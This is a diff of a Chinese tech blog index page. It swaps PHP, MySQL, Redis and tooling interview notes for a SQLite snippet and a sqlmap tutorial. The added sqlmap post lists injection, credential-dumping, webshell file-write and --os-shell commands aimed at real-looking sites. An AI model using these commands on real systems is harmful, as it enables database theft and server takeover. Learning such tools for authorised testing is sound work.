-<p>从<code>PHP7的NTS版本</code>开始，以上例程的引用将不再被计数<br>对于null，bool，int和double的类型变量，refcount永远不会计数；<br>对于对象、资源类型，refcount计数和php5的一致；<br>字符串引用，计数不变，&amp;地址发生改变<br>数组引用，键值不变的情况下计数<br>改变后引用全部作废，重新计算</p>
-<ul>
-<li>回收周期</li>
-</ul>
-<p><code>zend.enable_gc</code><code>php.ini</code>默认是打开的</p>
-<ul>
-<li>性能影响</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/benbenhan/articles/15904812.html">https://www.cnblogs.com/benbenhan/articles/15904812.html</a><br><a target="_blank" rel="noopener" href="https://docs.kilvn.com/tipi/chapt06/06-04-00-garbage-collection.html">https://docs.kilvn.com/tipi/chapt06/06-04-00-garbage-collection.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem=DRiKKpc8Q7W4D">https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem%3DDRiKKpc8Q7W4D</a></p>
-<h4 id="2.6">高并发优化</h4>
-
-<ul>
-<li>流量优化 - 防盗链处理</li>
-<li>前端优化<ol>
-<li>减少http请求次数</li>
-<li>添加异步请求</li>
-<li>启用浏览器缓存和文件压缩</li>
-<li>CDN加速</li>
-<li>建立独立的图片服务器(减少I&#x2F;O)</li>
-</ol>
-</li>
-<li>服务端优化<ol>
-<li>页面静态化</li>
-<li>并发处理</li>
-<li>队列处理</li>
-</ol>
-</li>
-<li>数据库优化<ol>
-<li>数据库缓存</li>
-<li>分库分表,分区</li>
-<li>读写分离</li>
-<li>负载均衡</li>
-</ol>
-</li>
-<li>web服务器优化<ol>
-<li>nginx反向代理实现负载均衡</li>
-<li>lvs实现负载均衡</li>
-</ol>
-</li>
-</ul>
-<h3 id="3">Mysql</h3>
-<h4 id="3.1">myisam和innodb区别以及事务四大特性</h4>
-
-<h4 id="3.2">mysql索引</h4>
-
-<blockquote>
-<p>从数据结构角度</p>
-</blockquote>
-<ul>
-<li>B+树索引(O(log(n)))：关于B+树索引，可以参考 MySQL索引背后的数据结构及算法原理</li>
-<li>hash索引：</li>
-</ul>
-<blockquote>
-<p>从物理存储角度</p>
-</blockquote>
-<ul>
-<li>聚集索引（clustered index）</li>
-<li>非聚集索引（non-clustered index）</li>
-</ul>
-<blockquote>
-<p>从逻辑角度</p>
-</blockquote>
-<ul>
-<li>主键索引：主键索引是一种特殊的唯一索引，不允许有空值</li>
-<li>普通索引或者单列索引</li>
-<li>多列索引（复合索引）：复合索引指多个字段上创建的索引，只有在查询条件中使用了创建索引时的第一个字段，索引才会被使用。使用复合索引时遵循最左前缀集合</li>
-<li>唯一索引或者非唯一索引</li>
-<li>空间索引：空间索引是对空间数据类型的字段建立的索引</li>
-</ul>
-<h4 id="3.3">主从-分区分表分库</h4>
-
-<ul>
-<li>分库：是为了解决数据库连接资源不足问题，和磁盘IO的性能瓶颈问题。</li>
-<li>分表：是为了解决单表数据量太大，sql语句查询数据时，即使走了索引也非常耗时问题。此外还可以解决消耗cpu资源问题。</li>
-<li>分库分表：可以解决 数据库连接资源不足、磁盘IO的性能瓶颈、检索数据耗时 和 消耗cpu资源等问题。</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="https://github.com/DavidSuperM/davidsuperm.github.io/blob/master/DB/mysql%E5%88%86%E5%8C%BA%E5%88%86%E8%A1%A8%E5%88%86%E5%BA%93%E6%96%B9%E6%A1%88.md">https://github.com/DavidSuperM/davidsuperm.github.io/blob/master/DB/mysql%E5%88%86%E5%8C%BA%E5%88%86%E8%A1%A8%E5%88%86%E5%BA%93%E6%96%B9%E6%A1%88.md</a></p>
-<h4 id="3.4">如何定位慢查询</h4>
-
-<ol>
-<li>首先确认是否开启了慢查询</li>
-<li>设置慢查询的时间限制</li>
-<li>查询慢查询日志可定位具体的慢sql</li>
-<li>相关sql查询</li>
-<li>用Explain分析具体的sql语句</li>
-</ol>
-<h3 id="5">Redis</h3>
-<h4 id="5.2">Redis常见数据结构</h4>
-
-<p>最常用的的有5种,字符串(String)、哈希(Hash)、列表(list)、集合(set)、有序集合(ZSET)</p>
-<blockquote>
-<p>元素唯一性：set中不允许重复的成员，而zset中不允许重复的成员，但是允许不同成员拥有相同的分数</p>
-</blockquote>
-<h4 id="5.3">Redis缓存雪崩、缓存穿透、缓存击穿</h4>
-
-
-<ul>
-<li><p>缓存雪崩<br>大量用户请求，全部转向请求访问数据库，压力剧增，可能导致数据库宕机，造成系统崩溃，造成缓存雪崩</p>
-</li>
-<li><p>缓存击穿<br>业务中几个数据会频繁访问，比如秒杀数据，被称为热点数据<br>如果某个热点数据过期了，此时大量用户请求，无法从缓存中读取，直接访问数据库，造成系统奔溃，缓存击穿</p>
-</li>
-<li><p>缓存穿透<br>当用户访问数据，既不在缓存中，也不在数据库，导致请求缓存时，发现缓存缺失，发现两者都没找到，没法构建缓存，</p>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>缓存异常</th>
-<th>产生原因</th>
-<th>应对方案</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>缓存雪崩</td>
-<td>大量数据同时过期</td>
-<td>1.均匀设置过期时间 - 过期时间后加随机数，保证不会再同一时间过期 </br>  2.互斥锁 - 保证同一时间只有一个请求来构建缓存 </br> 3.后台更新缓存</td>
-</tr>
-<tr>
-<td></td>
-<td>Redis 故障宕机</td>
-<td>1.服务熔断或请求限流机制 </br>  2.构建 Redis 缓存高可靠集群</td>
-</tr>
-<tr>
-<td>缓存击穿</td>
-<td>热点数据过期</td>
-<td>1.互斥锁 </br> 2.不给热点数据设置过期时间，由后台异步更新缓存</td>
-</tr>
-<tr>
-<td>缓存穿透</td>
-<td>访问的数据既不在缓存，也不在数据库</td>
-<td>1.非法请求 </br> 2.缓存空值或者默认值 </br> 3.使用布隆过滤器快速判断数据是否存在</td>
-</tr>
-</tbody></table>
-<h4 id="5.4">Redis淘汰策略</h4>
-<h4 id="5.5">Redis分布式锁怎么实现</h4>
-<h4 id="5.6">Redis的持久化机制:RDB-vs-AOF</h4>
-<h4 id="5.7">Redis主从哨兵和集群的区别</h4>
-<h4 id="5.8">节点扩容不同</h4>
-
-
-<h3 id="6">MQ</h3>
-<h4 id="6.1">RabbitMQ,RocketMQ,Kafka区别</h4>
-
-
-<table>
-<thead>
-<tr>
-<th>MQ消息队列</th>
-<th>优点</th>
-<th>缺点</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>RabbitMQ</td>
-<td>轻量级、容易部署和使用、支持多种客户端开发语言、支持灵活的路由配置</td>
-<td>对消息堆积的支持并不好、性能和吞吐量较差、使用 Erlang 语言编写，比较难进行二次开发</td>
-</tr>
-<tr>
-<td>RocketMQ</td>
-<td>性能好、稳定可靠、有活跃的中文社区、使用 Java 开发，容易进行二次开发、特点响应快</td>
-<td>兼容性较差</td>
-</tr>
-<tr>
-<td>Kafka</td>
-<td>兼容性极好、设计上大量使用了批量和异步的思想，有超高的性能</td>
-<td>由于 “先攒一波再一起处理” 的设计，时延较高，不太适合在线业务场景</td>
-</tr>
-</tbody></table>
-<h3 id="7">服务器&其它方面</h3>
-<h4 id="7.1">swoole</h4>
-
-<p>Swoole是一个面向生产环境的PHP 异步网络通信引擎，使PHP 开发人员可以编写高性能的异步并发TCP、UDP、Unix Socket、HTTP，WebSocket 服务</p>
-<h4 id="7.2">phpunit</h4>
-
-<p>PHPUnit 是 PHP 程式语言中最常见的单元测试 (unit testing) 框架，PHPUnit 是参考 xUnit 架构利用 PHP 实作出来。</p>
-<ol>
-<li>针对类 Example 的测试写在类 ExampleTest 中, ExampleTest 继承自 TestCase</li>
-<li>对于方法的测试命名为 test* 的公用方法</li>
-<li>在测试方法内，类似于 assertEquals() 的断言方法用来对实际值和预期值的匹配做出验证</li>
-</ol>
-<h4 id="7.3">php-cs-fixer</h4>
-
-<p>php-cs-fixer 是个代码格式化工具，格式化的标准是 PSR-1、PSR-2 以及一些 symfony 的标准。</p>
-<ul>
-<li>–verbose 用于展示应用了的规则<blockquote>
-<p>–verbose</p>
-</blockquote>
-</li>
-<li>–using-cache 不使用缓存<blockquote>
-<p>–using-cache&#x3D;no</p>
-</blockquote>
-</li>
-<li>–config 指定配置文件<blockquote>
-<p>–config&#x3D;.php-cs-fixer.php</p>
-</blockquote>
-</li>
-<li>–level 用于控制需要使用的规则层级（默认psr2）<blockquote>
-<p>–level&#x3D;psr0<br>–level&#x3D;psr1<br>–level&#x3D;psr2<br>–level&#x3D;symfony</p>
-</blockquote>
-</li>
-<li>–fixers 默认情况下执行的是 PSR-2 的所有选项以及一些附加选项（主要是 symfony 相关的）。还有一些属于『贡献级别』的选项，你可以通过 –fixers 选择性的添加，–fixers 的多个条件要用逗号分开<blockquote>
-<p>–fixers&#x3D;linefeed,short_tag,indentation</p>
-</blockquote>
-</li>
-<li>-name_of_fixer 设定禁用哪些选项。如果同时设定了 –fixers 和 -name_of_fixer，前者的优先级更高</li>
-<li>–dry-run 和 –diff 可以显示出需要修改的汇总，但是并不实际修改<blockquote>
-<p>.&#x2F;vendor&#x2F;bin&#x2F;php-cs-fixer fix –verbose –diff –dry-run</p>
-</blockquote>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment"># vendor/bin/php-cs-fixer fix --config=.php-cs-fixer.dist.php --dry-run --diff</span></span><br><span class="line"><span class="comment"># vendor/bin/php-cs-fixer fix --config=.php-cs-fixer.dist.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$finder</span> = PhpCsFixer\Finder::create()</span><br><span class="line">    -&gt;<span class="keyword">in</span>(__DIR__)</span><br><span class="line">    -&gt;name(<span class="string">&#x27;*.php&#x27;</span>)</span><br><span class="line">    -&gt;notName(<span class="string">&#x27;*.blade.php&#x27;</span>); // 排除一些文件类型</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> (new PhpCsFixer\Config())</span><br><span class="line">    -&gt;setUsingCache(<span class="literal">false</span>)  // 禁用缓存</span><br><span class="line">    -&gt;setRules([</span><br><span class="line">        <span class="string">&#x27;@PSR12&#x27;</span> =&gt; <span class="literal">true</span>,                      // 使用 PSR-12 标准</span><br><span class="line">        <span class="string">&#x27;no_unused_imports&#x27;</span> =&gt; <span class="literal">true</span>,            // 移除未使用的导入</span><br><span class="line">        <span class="string">&#x27;standardize_not_equals&#x27;</span> =&gt; <span class="literal">true</span>,       // 使用 `!==` 而不是 `&lt;&gt;`</span><br><span class="line">        <span class="string">&#x27;array_indentation&#x27;</span> =&gt; <span class="literal">true</span>,            // 数组缩进一致</span><br><span class="line">        <span class="string">&#x27;binary_operator_spaces&#x27;</span> =&gt; [<span class="string">&#x27;default&#x27;</span> =&gt; <span class="string">&#x27;align&#x27;</span>],  // 二元运算符对齐</span><br><span class="line">        <span class="string">&#x27;no_extra_blank_lines&#x27;</span> =&gt; <span class="literal">true</span>,         // 删除多余空行</span><br><span class="line">        <span class="string">&#x27;visibility_required&#x27;</span> =&gt; [<span class="string">&#x27;elements&#x27;</span> =&gt; [<span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;method&#x27;</span>]],  // 强制声明可见性</span><br><span class="line">        <span class="string">&#x27;no_trailing_whitespace&#x27;</span> =&gt; <span class="literal">true</span>,       // 删除行尾空白</span><br><span class="line">        <span class="string">&#x27;linebreak_after_opening_tag&#x27;</span> =&gt; <span class="literal">true</span>,  // 在 PHP 开标签后换行</span><br><span class="line">        <span class="string">&#x27;cast_spaces&#x27;</span> =&gt; [<span class="string">&#x27;space&#x27;</span> =&gt; <span class="string">&#x27;single&#x27;</span>], // 类型转换间隔为单空格</span><br><span class="line">        <span class="string">&#x27;align_multiline_comment&#x27;</span> =&gt; <span class="literal">true</span>,      // 多行注释对齐</span><br><span class="line">        <span class="string">&#x27;ternary_operator_spaces&#x27;</span> =&gt; <span class="literal">true</span>,      // 三元运算符间空格</span><br><span class="line">        <span class="string">&#x27;no_blank_lines_after_phpdoc&#x27;</span> =&gt; <span class="literal">true</span>,  // PHPDoc 后不允许空行</span><br><span class="line">        <span class="string">&#x27;method_argument_space&#x27;</span> =&gt; [<span class="string">&#x27;on_multiline&#x27;</span> =&gt; <span class="string">&#x27;ensure_fully_multiline&#x27;</span>],  // 方法参数一致性</span><br><span class="line">    ])</span><br><span class="line">    -&gt;setFinder(<span class="variable">$finder</span>);</span><br></pre></td></tr></table></figure>
-
-<h4 id="7.4">docker多版本启动共用</h4>
-
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/php-structure/">
-                PHP框架
+            <a href="/2026/09/19/springboot/">
+                Springboot
             </a>
         </h1>
         <div class="post-info">
@@ -1099,23 +719,38 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
 
     
         <div class="content">
-            <h2 id="thinkpkp-讨论"><a href="#thinkpkp-讨论" class="headerlink" title="thinkpkp 讨论"></a>thinkpkp 讨论</h2><h3 id="thinkphp-6以上适用命令"><a href="#thinkphp-6以上适用命令" class="headerlink" title="thinkphp 6以上适用命令"></a>thinkphp 6以上适用命令</h3><ul>
-<li>创建单例</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think</span><br></pre></td></tr></table></figure>
-<ul>
-<li>创建多例</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require topthink/think-multi-app</span><br></pre></td></tr></table></figure>
-<ul>
-<li>创建两个模型</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php think build admin</span><br><span class="line">php think build api</span><br></pre></td></tr></table></figure>
-<ul>
-<li>创建多层试图</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require topthink/think-view</span><br></pre></td></tr></table></figure>
+            <p>文章</p>
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h2 id="微服务-dubbo-zookeeper"><a href="#微服务-dubbo-zookeeper" class="headerlink" title="微服务 dubbo - zookeeper"></a>微服务 dubbo - zookeeper</h2><h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><h3 id="undertow-对比-tomcat"><a href="#undertow-对比-tomcat" class="headerlink" title="undertow 对比 tomcat"></a>undertow 对比 tomcat</h3>
+        </div>
+    
 
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/09/19/sqlite/">
+                SQLite
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/数据库/">数据库</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进数据库</span></span><br><span class="line">sqlite3 /Users/mac/tabby.db</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看有哪些表</span></span><br><span class="line">.tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 user 表内容</span></span><br><span class="line">SELECT * FROM user;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出</span></span><br><span class="line">.quit</span><br></pre></td></tr></table></figure>
 
         </div>
     
@@ -1127,8 +762,8 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/pressure-testing/">
-                压测工具集合
+            <a href="/2026/09/19/sqlmap/">
+                SQLMap
             </a>
         </h1>
         <div class="post-info">
@@ -1138,7 +773,7 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
             
             
                 <span class="category">
-                    <a href="/categories/测试工具/">测试工具</a>
+                    <a href="/categories/渗透工具/">渗透工具</a>
                 </span>
             
         </div>
@@ -1146,19 +781,654 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
 
     
         <div class="content">
-            <h1 id="并发请求处理"><a href="#并发请求处理" class="headerlink" title="并发请求处理"></a>并发请求处理</h1><ul>
-<li>HTTP&#x2F;HTTPS 接口：测试 Web API、RESTful 接口的吞吐量、QPS（每秒请求数）。</li>
-<li>数据库查询：高并发查询数据库，看是否会出现锁等待、死锁、超时等问题。</li>
-<li>后台任务：队列、定时任务（如 RabbitMQ、Kafka）在高负载下的稳定性。</li>
+            <p>文章</p>
+<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><h3 id="分类文章"><a href="#分类文章" class="headerlink" title="分类文章"></a>分类文章</h3><h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	http://www.vuln.cn/1992<br />
+</h3>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap简介
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap支持五种不同的注入模式：
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		4、联合查询注入，可以使用union的情况下的注入。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		5、堆查询注入，可以同时执行多条语句的执行时的注入。
+	</li>
 </ul>
-<h2 id="k6"><a href="#k6" class="headerlink" title="k6"></a>k6</h2><p>k6 是一个压力测试套件，使用 golang 编写。主要特性有：</p>
-<ul>
-<li>提供了友好的 CLI 工具</li>
-<li>使用 JavaScript 代码编写测试用例</li>
-<li>可以根据性能条件设置阈值，表明成功还是失败</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap支持的数据库有
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	检测注入
+</h2>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	基本格式
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1"
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	默认使用level1检测全部数据库类型
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	跟随302跳转
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br />
+当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br />
+目的就是：要追踪到错误信息。
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	cookie注入
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	当程序有防get注入的时候，可以使用cookie注入<br />
+sqlmap -u "http://www.baidu.com/shownews.asp" --cookie "id=11" --level 2（只有level达到2才会检测cookie）
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	从post数据包中注入
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	可以使用burpsuite或者temperdata等工具来抓取post包
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" -p "username" --dbms mysql &nbsp; &nbsp;指定username参数
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	注入成功后
+</h2>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	获取数据库基本信息
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 --dbs
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询有哪些数据库
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test --tables
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询test数据库中有哪些表
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin --columns
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询test数据库中admin表有哪些字段
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin -C "username,password" --dump
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	dump出字段username与password中的数据
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	其他命令参考下面
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	从数据库中搜索字段
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" --dbms mysql -D dedecms --search -C admin,password<br />
+在dedecms数据库中搜索字段admin或者password。
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	读取与写入文件
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	首先找需要网站的物理路径，其次需要有可写或可读权限。
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br />
+--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br />
+--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径<br />
+#示例：<br />
+sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	使用shell命令：
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" -p id --dms mysql --os-shell<br />
+接下来指定网站可写目录：<br />
+“E:\php\htdocs\dvwa”
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap详细命令：
+</h2>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--is-dba 当前用户权限（是否为root权限）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbs 所有数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-db 网站当前数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--users 所有数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-user 当前数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--random-agent 构造随机user-agent
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--passwords 数据库密码
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy http://local:8080 --threads 10 (可以自定义线程加速) 代理
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+	</li>
 </ul>
-<p>k6 没有使用 nodejs 而是 golang 程序，通过包裹了一个 JavaScript 运行时来运行 JavaScript 脚本，因此不能直接使用 npm 包以及 Nodejs 提供的一些 API。</p>
-<p>同时，k6 在运行测试时，没有启动浏览器，主要用于测试页面以及 API 加载速度。k6 提供了通过网络请求（HAR）生成测试脚本的方法，实现更简便的测试脚本编写，以及 session 的维护。</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	——————————————————————————————————
+</p>
